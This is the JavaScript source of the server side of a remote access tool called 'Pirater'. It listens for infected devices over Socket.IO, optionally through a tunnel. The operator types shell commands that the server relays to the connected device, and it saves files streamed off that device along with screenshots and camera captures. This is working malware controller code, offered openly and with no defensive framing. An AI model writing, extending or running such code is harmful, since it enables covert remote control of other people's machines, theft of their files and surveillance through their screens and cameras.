const express=require('express');
const fs=require('fs');
const path=require('path');
const app =express();
const prompt=require('prompt-sync')();
const {v4:uuid4}=require('uuid');
const figlet = require('figlet');
const chalk=require('chalk');
const pipe=require('../scripts/pipe');
const {encrypt,decrypt}=require('../scripts/crypto');
const server = require('http').createServer(app);
const io=require('socket.io')(server);
const configFile=path.join(__dirname,'../config.json');
const config=JSON.parse(fs.readFileSync(configFile,'utf-8'));

const port=config.port||1313;

if(config.tunnel){

    const tunnel=require('../scripts/tunnel');
    const domain=config.domain;

    config.domain?tunnel(port,domain):tunnel(port);

}

const help=fs.readFileSync(path.join(process.cwd(),'help.txt'),'utf8');

let connected;
let WD;

io.on('connection',socket=>{

socket.emit('connected');
socket.on('start',info=>{

const data=config.secure?JSON.parse(decrypt(config.key,info)):info;

if(!connected){
console.log(`
 ${chalk.blue(data.device)} connected✅
        
`);
    connected=true;
}

    WD=data.dir;

    function cli(){
        let command=prompt(`${chalk.blueBright(WD)} ${chalk.redBright('$')}`);
        if(command!==null&&command.includes('pipe')){
            const filename=command.replace('pipe ','');
            pipe(socket,filename,config);
        }
        else if(command=='help'){
            console.log(chalk.hex('#ffe0a0')(help));
            socket.emit('shell','cwd');
        }
        else if(command=="exit"){
            console.log(`Pirater ${chalk.hex('#ff0066')('exited')}.`);
            process.exit(0);
        }
        else{
            socket.emit('shell',config.secure?encrypt(config.key,command):command);
        }
    }

    cli();

    socket.on('res',output=>{
        const response=config.secure?JSON.parse(decrypt(config.key,output)):output;
        const {res}=response;
        WD=response.dir;
        if(typeof res==='string'&&res.includes('error:')){
            console.log(chalk.redBright(res));
        }
        else if(typeof res==='object'){
            console.table(res);
        }
        else{
            console.log(chalk.hex('#ffe0a0 ')(res));
        }
            cli();
    });


    socket.on('start-stream',data=>{
        const filename=config.secure?decrypt(config.key,data):data;
        if(fs.existsSync('streams')){
            //Do nothing
        }else{
            fs.mkdirSync('streams');
        }
        const output=fs.createWriteStream(`./streams/${filename}`);
        socket.on('stream',chunk=>{
            output.write(config.secure?decrypt(config.key,chunk):chunk);
        });

    });

    socket.on('start-snap',data=>{
        const format=config.secure?decrypt(config.key,data):data;
        if(fs.existsSync('screenshots')){
            //Do nothing
        }else{
            fs.mkdirSync('screenshots');
        }
        const image=fs.createWriteStream(`./screenshots/snap${uuid4()}.${format}`);

        socket.on('snap',chunk=>{
            image.write(config.secure?decrypt(config.key,chunk):chunk);
        });

    });

    socket.on('start-capture',data=>{
        const format=config.secure?decrypt(config.key,data):data;

        if(fs.existsSync('images')){
            //Do nothing
        }else{
            fs.mkdirSync('images');
        }
        const picture=fs.createWriteStream(`./images/image${uuid4()}.${format}`);

        socket.on('capture',chunk=>{
            picture.write(config.secure?decrypt(config.key,chunk):chunk);
        });

    });

});

});

server.listen(port,()=>{
    console.log(`Server listening on port:${chalk.blue(port)}`);
        figlet('Pirater',function(err,data) {
        if (err) {
            console.log('Something went wrong...');
            console.dir(err);
            return;
        }
        console.log(data);
    });
});